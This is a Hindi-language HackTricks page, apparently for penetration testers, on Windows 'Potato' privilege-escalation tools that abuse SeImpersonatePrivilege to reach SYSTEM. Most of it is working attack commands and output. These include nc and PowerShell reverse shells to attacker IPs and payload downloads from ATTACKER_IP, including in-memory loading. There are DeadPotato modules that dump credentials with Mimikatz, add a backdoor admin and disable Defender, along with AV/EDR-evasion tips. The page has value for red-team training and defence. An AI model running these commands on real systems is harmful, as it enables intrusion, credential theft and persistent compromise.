# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato काम नहीं करता** Windows Server 2019 और Windows 10 build 1809 या उसके बाद के versions पर। हालांकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का इस्तेमाल **इन्हीं privileges का लाभ उठाकर `NT AUTHORITY\SYSTEM` स्तर का access पाने** के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` tool के बारे में विस्तार से बताती है। इसका इस्तेमाल उन Windows 10 और Server 2019 hosts पर impersonation privileges का दुरुपयोग करने के लिए किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025 में नियमित रूप से maintain किया जाने वाला एक आधुनिक विकल्प SigmaPotato है (यह GodPotato का fork है), जिसमें in-memory/.NET reflection का उपयोग और विस्तारित OS support जोड़ा गया है। नीचे quick usage और References में repo देखें।

पृष्ठभूमि और manual techniques के लिए संबंधित पेज:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और आम समस्याएँ

नीचे दी गई सभी techniques ऐसे privileged service का दुरुपयोग करती हैं जो impersonation कर सकती है। इसके लिए context में इनमें से कोई एक privilege होना चाहिए:

- SeImpersonatePrivilege (सबसे आम) या SeAssignPrimaryTokenPrivilege
- अगर token में पहले से SeImpersonatePrivilege है, तो High integrity आवश्यक नहीं है (कई service accounts, जैसे IIS AppPool, MSSQL आदि के लिए यह आम है)

Privileges जल्दी जाँचें:

```cmd
whoami /priv | findstr /i impersonate
```

परिचालन संबंधी नोट्स:

- अगर आपका shell ऐसे restricted token के तहत चलता है जिसमें SeImpersonatePrivilege नहीं है (कुछ संदर्भों में Local Service/Network Service के लिए आम), तो FullPowers का उपयोग करके account के default privileges वापस पाएं, फिर Potato चलाएं। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- किसी process token में उसी service account या logon session के दूसरे token की तुलना में कम privileges हो सकते हैं। कुछ configurations में, same-session named-pipe client ऐसा अलग token उपलब्ध करा सकता है जिसमें SeImpersonatePrivilege हो, लेकिन service का configured `RequiredPrivileges` और `whoami /priv` अलग-अलग चीज़ों का विवरण देते हैं और यह साबित नहीं करते कि ऐसा token उपलब्ध है। Impersonation path पर विचार करने से पहले actual token verify करें।
- PrintSpoofer के लिए Print Spooler service का चलना और local RPC endpoint (spoolss) के ज़रिए पहुंच योग्य होना ज़रूरी है। ऐसे hardened environments में जहां PrintNightmare के बाद Spooler disabled है, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato के लिए TCP/135 पर पहुंच योग्य OXID resolver आवश्यक है। अगर egress blocked है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। इस्तेमाल हो रहे build द्वारा supported flags जांचें।
- EfsPotato/SharpEfsPotato, MS-EFSR का दुरुपयोग करते हैं; अगर एक pipe blocked है, तो alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon) आज़माएं।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आम तौर पर किसी unknown/unsupported RPC authentication service को दर्शाता है; कोई दूसरा pipe/transport आज़माएं या सुनिश्चित करें कि target service चल रही है।
- DeadPotato जैसे “Kitchen-sink” forks में अतिरिक्त payload modules (Mimikatz/SharpHound/Defender off) शामिल होते हैं, जो disk को छूते हैं; slim originals की तुलना में EDR detection अधिक होने की अपेक्षा रखें।

## त्वरित डेमो

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

नोट्स:
- मौजूदा कंसोल में interactive process शुरू करने के लिए `-i` का उपयोग करें, या one-liner चलाने के लिए `-c` का।
- Spooler service आवश्यक है। अगर यह disabled है, तो यह विफल हो जाएगा।

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

[upstream usage](https://github.com/antonioCoco/RoguePotato#usage) में, `-e` command देता है, `-l` local resolver port चुनता है, और वैकल्पिक `-c` CLSID चुनता है। अगर COM activation ऐसी service शुरू करता है जिसका executable path पहले से modified है, तो वह service token impersonation से स्वतंत्र रूप से अपना बदला हुआ command execute कर सकती है; देखे गए SYSTEM execution का श्रेय इस technique को देने से पहले service configuration की जाँच करें।

अगर outbound 135 blocked है, तो अपने redirector पर socat के ज़रिए OXID resolver को pivot करें:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato एक नया COM abuse primitive है, जिसे 2022 के अंत में जारी किया गया था। यह Spooler/BITS के बजाय **PrintNotify** service को target करता है। Binary, PrintNotify COM server को instantiate करता है, एक fake `IUnknown` को swap in करता है, फिर `CreatePointerMoniker` के ज़रिए एक privileged callback trigger करता है। जब **SYSTEM** के रूप में चल रही PrintNotify service वापस connect करती है, तो process मिले हुए token को duplicate करता है और दिए गए payload को पूरे privileges के साथ spawn करता है।<sup>[[13]](#references)</sup>

मुख्य operational बातें:

* Windows 10/11 और Windows Server 2012–2022 पर काम करता है, बशर्ते Print Workflow/PrintNotify service installed हो (PrintNightmare के बाद legacy Spooler disabled होने पर भी यह मौजूद रहती है)।
* Calling context के पास **SeImpersonatePrivilege** होना आवश्यक है (यह IIS APPPOOL, MSSQL और scheduled-task service accounts के लिए आम है)।
* Direct command या interactive mode, दोनों स्वीकार करता है, ताकि आप original console के अंदर बने रह सकें। उदाहरण:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* क्योंकि यह पूरी तरह COM-based है, इसलिए named-pipe listeners या external redirectors की आवश्यकता नहीं होती, जिससे यह उन hosts पर drop-in replacement बन जाता है जहाँ Defender, RoguePotato की RPC binding को block करता है।

Ink Dragon जैसे ऑपरेटर SharePoint पर ViewState RCE हासिल करने के तुरंत बाद PrintNotifyPotato चलाते हैं, ताकि ShadowPad install करने से पहले `w3wp.exe` worker से SYSTEM तक pivot कर सकें।<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

सलाह: यदि एक pipe काम न करे या EDR उसे block कर दे, तो अन्य supported pipes आज़माएँ:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

नोट्स:
- SeImpersonatePrivilege मौजूद होने पर Windows 8/8.1–11 और Server 2012–2022 पर काम करता है।
- इंस्टॉल किए गए runtime से मेल खाने वाली binary लें (उदाहरण के लिए, आधुनिक Server 2022 पर `GodPotato-NET4.exe`)।
- यदि आपका शुरुआती execution primitive ऐसा webshell/UI है जिसमें timeout कम है, तो payload को script के रूप में stage करें और लंबे inline command के बजाय GodPotato से उसे चलाने के लिए कहें।<sup>[[12]](#references)</sup>

लिखने योग्य IIS webroot से जल्दी staging करने का तरीका:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, service DCOM objects को target करने वाले दो variants प्रदान करता है, जिनका default RPC_C_IMP_LEVEL_IMPERSONATE होता है। दिए गए binaries को build करें या उनका उपयोग करें और अपना command चलाएँ:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (अपडेट किया गया GodPotato fork)

SigmaPotato में .NET reflection के ज़रिए in-memory execution और PowerShell reverse shell helper जैसी आधुनिक सुविधाएँ जोड़ी गई हैं।<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024–2025 builds (v1.2.x) में अतिरिक्त फायदे:
- Built-in reverse shell flag `--revshell` और 1024-char PowerShell limit को हटाना, ताकि आप लंबे AMSI-bypassing payloads एक ही बार में चला सकें।
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), साथ ही साधारण heuristics को चकमा देने के लिए `VirtualAllocExNuma()` के ज़रिए एक बुनियादी AV evasion trick।
- PowerShell Core environments के लिए .NET 2.0 के साथ compiled अलग `SigmaPotatoCore.exe`।

### DeadPotato (modules के साथ 2024 GodPotato rework)

DeadPotato, GodPotato की OXID/DCOM impersonation chain को बनाए रखता है, लेकिन इसमें post-exploitation helpers शामिल हैं, ताकि operators तुरंत SYSTEM access लेकर अतिरिक्त tooling के बिना persistence/collection कर सकें।<sup>[[15]](#references)</sup>

आम modules (सभी के लिए SeImpersonatePrivilege आवश्यक है):

- `-cmd "<cmd>"` — SYSTEM के रूप में arbitrary command चलाएँ।
- `-rev <ip:port>` — quick reverse shell।
- `-newadmin user:pass` — persistence के लिए local admin बनाएँ।
- `-mimi sam|lsa|all` — credentials dump करने के लिए Mimikatz को drop करके चलाएँ (disk को छूता है, noisy)।
- `-sharphound` — SYSTEM के रूप में SharpHound collection चलाएँ।
- `-defender off` — Defender real-time protection बंद करें (बहुत noisy)।

उदाहरण one-liners:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

क्योंकि इसमें अतिरिक्त binaries शामिल हैं, इसलिए AV/EDR द्वारा अधिक flags की अपेक्षा करें; stealth महत्वपूर्ण हो, तो हल्के GodPotato/SigmaPotato का उपयोग करें।

## References

- [1] [PrintSpoofer – Windows 10 और Server 2019 में Impersonation Privileges का दुरुपयोग](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [अब JuicyPotato नहीं? पुरानी बात, RoguePotato का स्वागत है](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – service accounts के लिए डिफ़ॉल्ट token privileges बहाल करें](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction से webroot RCE → SYSTEM तक FullPowers + GodPotato](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → SYSTEM तक GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragon के भीतर: Relay Network और एक Stealthy Offensive Operation की आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – built-in post-ex modules के साथ GodPotato का rework](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
